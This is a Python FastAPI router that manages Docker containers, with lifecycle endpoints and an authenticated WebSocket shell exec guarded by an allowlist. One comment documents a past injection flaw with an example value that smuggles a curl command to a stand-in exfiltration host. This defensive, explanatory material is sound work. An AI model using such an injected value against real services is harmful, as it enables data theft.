from fastapi import APIRouter, Depends, status, Request, WebSocket, WebSocketDisconnect, Query, HTTPException
from sse_starlette.sse import EventSourceResponse
from api.auth.jwt import get_auth_wrapper, get_secret_key, revoke_token, get_current_user_token
from api.auth.auth import auth_check, check_permission
from api.utils.security import limiter
import api.actions.containers as actions
import asyncio
import aiodocker
from aiodocker.exceptions import DockerError
import logging
import jwt
import json
from api.settings import get_settings
settings = get_settings()
import shlex
from sqlalchemy.ext.asyncio import AsyncSession
from sqlalchemy import select
from api.utils.auth import get_db
from api.db.database import SessionLocal
from api.db.models.users import User
from api.db.models.settings import TokenBlacklist
from api.utils.audit import log_activity
from api.utils.error_handler import safe_http_status

logger = logging.getLogger(__name__)

router = APIRouter()

@router.get("/stats")
@limiter.limit("60/minute")
async def get_all_container_stats(request: Request, db: AsyncSession = Depends(get_db), Authorize: get_auth_wrapper = Depends(get_auth_wrapper)):
    await auth_check(Authorize)
    await check_permission("perm_start", Authorize, db)
    return await actions.get_all_stats()


# Only these shell paths can be invoked through the exec WebSocket. Anything
# else is rejected before we open the docker exec stream. Previously the
# `shell` query parameter was forwarded to shlex.split + aiodocker.exec
# verbatim, which let a caller smuggle a full command line via something
# like ?shell=/bin/sh+-c+'curl%20evil/exfil'.
# Valid container identifiers per Docker: either a hex id (12 or 64 chars,
# but the daemon accepts any prefix >= 1) or a name matching the docker
# name regex `[a-zA-Z0-9][a-zA-Z0-9_.-]*`. We accept the union and cap at
# 255 chars so a hostile caller can't smuggle URL-path tricks through the
# `{container_id}` placeholder into the aiodocker client.
import re as _re
_CONTAINER_ID_RE = _re.compile(r"^[A-Za-z0-9][A-Za-z0-9_.-]{0,254}$")
ALLOWED_EXEC_SHELLS = {
    "/bin/bash",
    "/bin/sh",
    "/bin/ash",
    "/bin/zsh",
    "/usr/bin/bash",
    "/usr/bin/sh",
    "/usr/bin/ash",
    "/usr/bin/zsh",
}


# --- Helpers ---

def _validate_container_id(container_id: str) -> str:
    if not container_id or not _CONTAINER_ID_RE.match(container_id):
        raise HTTPException(status_code=400, detail="Invalid container identifier")
    return container_id


@router.get("/")
@limiter.limit("60/minute")
async def list_containers(
    request: Request,
    db: AsyncSession = Depends(get_db),
    Authorize: get_auth_wrapper = Depends(get_auth_wrapper)
):
    await auth_check(Authorize)
    await check_permission("perm_start", Authorize, db)
    return await actions.get_containers()


@router.post("/{container_id}/start")
@limiter.limit("30/minute")
async def start_container(
    request: Request,
    container_id: str,
    db: AsyncSession = Depends(get_db),
    Authorize: get_auth_wrapper = Depends(get_auth_wrapper)
):
    await auth_check(Authorize)
    await check_permission("perm_start", Authorize, db)
    if Authorize.is_api_key():
        raise HTTPException(403, "Container lifecycle actions are not available via API key")
    container_id = _validate_container_id(container_id)
    user = await Authorize.get_jwt_subject()

    # Perform action
    docker = aiodocker.Docker(url=get_settings().DOCKER_HOST)
    try:
        container = await docker.containers.get(container_id)
        await container.start()
        await log_activity(db, user, "start", container_id)
        return {"message": "Container started"}
    except DockerError as e:
        # Map docker daemon errors to their proper HTTP status (404 for
        # "no such container", 409 for "already started", etc.) instead
        # of collapsing everything to 500 with the raw message — which
        # could echo internal paths / daemon details back to the client.
        logger.error("Error starting container %s: %s", container_id, e)
        status_code = safe_http_status(e)
        raise HTTPException(status_code=status_code, detail="Failed to start container")
    except Exception as e:
        logger.exception("Unexpected error starting container %s", container_id)
        raise HTTPException(status_code=500, detail="Internal error")
    finally:
        await docker.close()


@router.post("/{container_id}/stop")
@limiter.limit("30/minute")
async def stop_container(
    request: Request,
    container_id: str,
    db: AsyncSession = Depends(get_db),
    Authorize: get_auth_wrapper = Depends(get_auth_wrapper)
):
    await auth_check(Authorize)
    await check_permission("perm_stop", Authorize, db)
    if Authorize.is_api_key():
        raise HTTPException(403, "Container lifecycle actions are not available via API key")
    container_id = _validate_container_id(container_id)
    user = await Authorize.get_jwt_subject()

    docker = aiodocker.Docker(url=get_settings().DOCKER_HOST)
    try:
        container = await docker.containers.get(container_id)
        await container.stop()
        await log_activity(db, user, "stop", container_id)
        return {"message": "Container stopped"}
    except DockerError as e:
        logger.error("Error stopping container %s: %s", container_id, e)
        status_code = safe_http_status(e)
        raise HTTPException(status_code=status_code, detail="Failed to stop container")
    except Exception:
        logger.exception("Unexpected error stopping container %s", container_id)
        raise HTTPException(status_code=500, detail="Internal error")
    finally:
        await docker.close()


@router.post("/{container_id}/restart")
@limiter.limit("30/minute")
async def restart_container(
    request: Request,
    container_id: str,
    db: AsyncSession = Depends(get_db),
    Authorize: get_auth_wrapper = Depends(get_auth_wrapper)
):
    await auth_check(Authorize)
    await check_permission("perm_restart", Authorize, db)
    if Authorize.is_api_key():
        raise HTTPException(403, "Container lifecycle actions are not available via API key")
    container_id = _validate_container_id(container_id)
    user = await Authorize.get_jwt_subject()

    docker = aiodocker.Docker(url=get_settings().DOCKER_HOST)
    try:
        container = await docker.containers.get(container_id)
        await container.restart()
        await log_activity(db, user, "restart", container_id)
        return {"message": "Container restarted"}
    except DockerError as e:
        logger.error("Error restarting container %s: %s", container_id, e)
        status_code = safe_http_status(e)
        raise HTTPException(status_code=status_code, detail="Failed to restart container")
    except Exception:
        logger.exception("Unexpected error restarting container %s", container_id)
        raise HTTPException(status_code=500, detail="Internal error")
    finally:
        await docker.close()


@router.delete("/{container_id}")
@limiter.limit("30/minute")
async def delete_container(
    request: Request,
    container_id: str,
    db: AsyncSession = Depends(get_db),
    Authorize: get_auth_wrapper = Depends(get_auth_wrapper)
):
    await auth_check(Authorize)
    await check_permission("perm_delete", Authorize, db)
    if Authorize.is_api_key():
        raise HTTPException(403, "Container lifecycle actions are not available via API key")
    container_id = _validate_container_id(container_id)
    user = await Authorize.get_jwt_subject()

    docker = aiodocker.Docker(url=get_settings().DOCKER_HOST)
    try:
        container = await docker.containers.get(container_id)
        await container.delete(force=True)
        await log_activity(db, user, "delete", container_id)
        return {"message": "Container deleted"}
    except DockerError as e:
        # 404 for "no such container" is the right answer — the previous
        # blanket 500 made it impossible for the frontend to distinguish
        # "you deleted something that never existed" from "the docker
        # daemon is unreachable".
        logger.error("Error deleting container %s: %s", container_id, e)
        status_code = safe_http_status(e)
        if status_code == 404:
            raise HTTPException(status_code=404, detail="Container not found")
        raise HTTPException(status_code=status_code, detail="Failed to delete container")
    except Exception:
        logger.exception("Unexpected error deleting container %s", container_id)
        raise HTTPException(status_code=500, detail="Internal error")
    finally:
        await docker.close()


@router.get("/{container_id}/logs")
@limiter.limit("60/minute")
async def get_container_logs(
    request: Request,
    container_id: str,
    db: AsyncSession = Depends(get_db),
    Authorize: get_auth_wrapper = Depends(get_auth_wrapper)
):
    await auth_check(Authorize)
    await check_permission("perm_start", Authorize, db)
    container_id = _validate_container_id(container_id)
    follow = request.query_params.get("follow", "false").lower() == "true"
    tail = request.query_params.get("tail", "200")
    try:
        tail = 10000 if tail == "all" else max(0, min(int(tail), 10000))
    except ValueError:
        raise HTTPException(422, "Invalid log tail") from None
    since = request.query_params.get("since", None)
    timestamps = request.query_params.get("timestamps", "false").lower() == "true"

    if follow:
        return EventSourceResponse(
            actions.get_logs_generator(
                container_id, tail=tail, follow=True, timestamps=timestamps
            ),
            media_type="text/event-stream",
        )

    return await actions.get_logs(container_id, tail=tail, since=since, timestamps=timestamps)


@router.get("/{container_id}/stats")
@limiter.limit("60/minute")
async def get_container_stats(
    request: Request,
    container_id: str,
    db: AsyncSession = Depends(get_db),
    Authorize: get_auth_wrapper = Depends(get_auth_wrapper)
):
    await auth_check(Authorize)
    await check_permission("perm_start", Authorize, db)
    container_id = _validate_container_id(container_id)
    stream = request.query_params.get("stream", "false").lower() == "true"

    if stream:
        return EventSourceResponse(
            actions.stream_stats_generator(request, container_id),
            media_type="text/event-stream",
        )

    return await actions.get_stats(container_id)


@router.websocket("/{container_id}/exec")
async def container_exec_websocket(
    websocket: WebSocket,
    container_id: str,
    shell: str = Query(default="/bin/bash"),
):
    await websocket.accept()
    try:
        container_id = _validate_container_id(container_id)
    except HTTPException:
        await websocket.send_json({"error": "Forbidden: invalid container id"})
        await websocket.close(code=1008)
        return

    # Whitelist the requested shell before doing any auth work, so token
    # probing attempts get no signal from the docker daemon.
    # shlex.split is safe here because we have already constrained `shell`
    # to a single path token from the allowlist; an attacker who tried to
    # smuggle spaces or options would first fail this membership check.
    if shell.strip() not in ALLOWED_EXEC_SHELLS:
        logger.warning("WebSocket exec rejected: disallowed shell %r", shell)
        await websocket.send_json({"error": "Forbidden: shell not allowed"})
        await websocket.close(code=1008)
        return

    token = None
    if hasattr(websocket, "cookies") and websocket.cookies:
        token = websocket.cookies.get("access_token_cookie")
    if isinstance(token, bytes):
        token = token.decode("utf-8")

    # In dev mode we still want a deterministic audit identity. Use a
    # synthetic username so the audit log remains usable.
    username = "dev"

    if not settings.DISABLE_AUTH:
        if not token:
            logger.warning("WebSocket exec rejected: no token")
            await websocket.send_json({"error": "Unauthorized"})
            await websocket.close(code=1008)
            return

        try:
            claims = jwt.decode(token, get_secret_key(), algorithms=["HS256"])
        except Exception as e:
            logger.error("WebSocket Auth Error: %s", e)
            await websocket.send_json({"error": "Unauthorized"})
            await websocket.close(code=1008)
            return

        if claims.get("setup_pending"):
            logger.warning(
                "WebSocket exec rejected: setup_pending token for user %r",
                claims.get("sub"),
            )
            await websocket.send_json({"error": "Forbidden: setup not completed"})
            await websocket.close(code=1008)
            return
        if claims.get("type") == "api_key":
            await websocket.send_json({"error": "Forbidden"})
            await websocket.close(code=1008)
            return

        # Hard-revocation check: if the token's jti is in the blacklist,
        # the token has been logged out / revoked and must not open a shell.
        jti = claims.get("jti")
        if jti:
            auth_db = SessionLocal()
            try:
                result = await auth_db.execute(
                    select(TokenBlacklist).filter(TokenBlacklist.jti == jti)
                )
                if result.scalars().first() is not None:
                    logger.warning("WebSocket exec rejected: revoked token (jti=%r)", jti)
                    await websocket.send_json({"error": "Unauthorized: token revoked"})
                    await websocket.close(code=1008)
                    return
            finally:
                await auth_db.close()

        username = claims.get("sub")
        if not username:
            await websocket.send_json({"error": "Unauthorized"})
            await websocket.close(code=1008)
            return

        auth_db = SessionLocal()
        try:
            result = await auth_db.execute(select(User).filter(User.username == username))
            user = result.scalars().first()
        finally:
            await auth_db.close()

        if not user or not user.is_active or not claims.get("av") or claims["av"] != user.auth_version:
            logger.warning("WebSocket exec rejected: inactive or unknown user %r", username)
            await websocket.send_json({"error": "Forbidden"})
            await websocket.close(code=1008)
            return

        # Shell access to a running container is equivalent to start/stop
        # capability for the container's payload. Gate it behind perm_start
        # (admins implicitly pass).
        if not user.is_superuser and not getattr(user, "perm_start", False):
            logger.warning("WebSocket exec rejected: user %r lacks perm_start", username)
            await websocket.send_json({"error": "Forbidden: missing permission"})
            await websocket.close(code=1008)
            return

    # Audit log the session initiation (not the terminal contents).
    audit_db = SessionLocal()
    try:
        await log_activity(audit_db, username, "container_exec", container_id, f"shell={shell}")
    except Exception as exc:
        logger.error("Failed to write exec audit log: %s", exc)
    finally:
        await audit_db.close()

    docker = None
    exec_id = None
    stream = None

    try:
        docker = aiodocker.Docker(url=get_settings().DOCKER_HOST)
        # Create exec instance
        # Ensure container exists
        try:
            container = await docker.containers.get(container_id)
        except Exception as e:
            logger.error(f"Container not found error: {e}")
            await websocket.close(code=1008, reason="Container not found")
            return

        exec_instance = await container.exec(cmd=[shell.strip(), "-i", "-l"], stdin=True, stdout=True, stderr=True, tty=True)
        exec_id = exec_instance.id
        if not exec_id:
            logger.error("No exec ID returned")
            await websocket.close(code=1011, reason="Failed to create exec instance")
            return

        stream = exec_instance.start(detach=False)

        async def docker_to_ws():
            try:
                while True:
                    msg = await stream.read_out()
                    if msg is None:
                        break
                    if isinstance(msg.data, bytes):
                        await websocket.send_bytes(msg.data)
                    else:
                        await websocket.send_text(str(msg.data))
            except Exception as e:
                logger.error(f"Docker to WS error: {e}")

        async def ws_to_docker():
            try:
                while True:
                    data = await websocket.receive_text()
                    if data.startswith('{'):
                        try:
                            control = json.loads(data)
                        except (ValueError, TypeError):
                            control = None
                        if isinstance(control, dict) and control.get("type") == "resize":
                            cols, rows = control.get("cols"), control.get("rows")
                            if type(cols) is int and type(rows) is int and 1 <= cols <= 1000 and 1 <= rows <= 1000:
                                await exec_instance.resize(h=rows, w=cols)
                            continue
                    # Respect client-side resize messages without forwarding them to the shell
                    if data.startswith("__resize__:"):
                        continue
                    # Convert CRLF to LF for terminal consistency
                    await stream.write_in(data.encode("utf-8"))
            except WebSocketDisconnect:
                logger.info("WebSocket disconnected for container %s", container_id)
            except Exception as e:
                logger.error(f"WS to Docker error: {e}")

        async def session_guard():
            from api.auth.jwt import _is_jti_revoked
            while True:
                await asyncio.sleep(5)
                if not settings.DISABLE_AUTH:
                    if claims.get("exp", 0) <= __import__("time").time() or await _is_jti_revoked(claims.get("jti")):
                        return
                    async with SessionLocal() as db:
                        fresh = (await db.execute(select(User).where(User.username == username))).scalars().first()
                        if not fresh or not fresh.is_active or fresh.auth_version != claims.get("av") or not (fresh.is_superuser or fresh.perm_start):
                            return
                # The outer policy middleware also guards each input frame.
        tasks = [asyncio.create_task(docker_to_ws()), asyncio.create_task(ws_to_docker()), asyncio.create_task(session_guard())]
        try:
            await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
        finally:
            for task in tasks:
                task.cancel()
            await asyncio.gather(*tasks, return_exceptions=True)
        await websocket.close(code=1000)

    except Exception as e:
        logger.error(f"WebSocket exec error: {e}")
        try:
            await websocket.close(code=1011, reason="Internal error")
        except Exception:
            pass
    finally:
        if stream and hasattr(stream, "close"):
            try:
                await stream.close()
            except Exception:
                pass
        if docker is not None:
            await docker.close()
